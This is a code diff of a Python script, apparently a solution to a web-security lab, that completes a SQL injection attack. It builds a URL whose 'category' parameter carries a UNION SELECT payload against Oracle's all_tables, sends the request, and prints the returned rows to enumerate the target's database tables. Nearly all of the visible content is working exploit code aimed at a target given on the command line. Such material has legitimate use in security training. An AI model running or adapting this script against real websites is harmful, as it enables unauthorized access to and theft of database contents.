@@ -1,5 +1,3 @@
-# incomplete
-
 import requests
 import argparse
 import bs4
@@ -25,3 +23,17 @@ else:
 
 # /filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--
 # USERS_
+
+payload = args.target + "/filter?category=Accessories' UNION SELECT table_name,NULL from all_tables--"
+print('[*] Payload created: ' + payload)
+
+s = requests.Session()
+r = s.get(payload)
+
+if r.status_code == 200:
+    print('[*] Payload sent')
+    soup = bs4.BeautifulSoup(r.content, 'html.parser')
+    rows = soup.select('tbody tr')
+    for row in rows:
+        print(row)
+
